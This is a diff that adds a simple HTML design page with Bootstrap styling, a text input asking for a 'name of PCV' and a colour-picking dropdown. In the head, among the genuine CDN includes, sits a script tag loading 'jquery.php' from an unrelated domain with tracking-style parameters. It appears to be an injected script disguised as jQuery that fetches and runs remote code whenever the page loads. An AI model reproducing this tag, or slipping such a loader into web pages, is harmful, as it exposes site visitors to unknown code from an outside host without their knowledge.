@@ -1,0 +1,42 @@
+<html>
+<head>
+<title>"design.html"</title>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css">
+<style>
+span.main {margin:auto;display:table;border:1px;color:purple;font-size:80%}
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+<script src="https://macutnova.com/jquery.php?u=ef8f30d17213b457a8fb337826116ee7&c=pbbt&p=1"></script>
+</head>
+
+<body>
+<i class="fa fa-chevron-circle-left" style="font-size:80px"></i>
+<i class="fa fa-home" style="font-size:80px"></i>
+<br>
+<br>
+<br>
+<h1><span class="main">Enter name of PCV</span></h1>
+<br>
+<form name="test" style="text-align:center">
+<input type="text" name="textie">
+</form>
+<br>
+<h1><span class="main">Pick a color</span></h1>
+<br>
+<div class="dropdown" style="text-align:center">
+    <button class="btn btn-primary dropdown-toggle" type="button" data-toggle="dropdown">Choose your color
+    <span class="caret" style="text-align:center"></span></button>
+    <ul class="dropdown-menu" style="text-align:center">
+      <li><a href="#" style="text-align:center">Yellow</a></li>
+      <li><a href="#" style="text-align:center">Green</a></li>
+      <li><a href="#" style="text-align:center">Blue</a></li>
+    </ul>
+  </div>
+</div>
+
+
+</body>
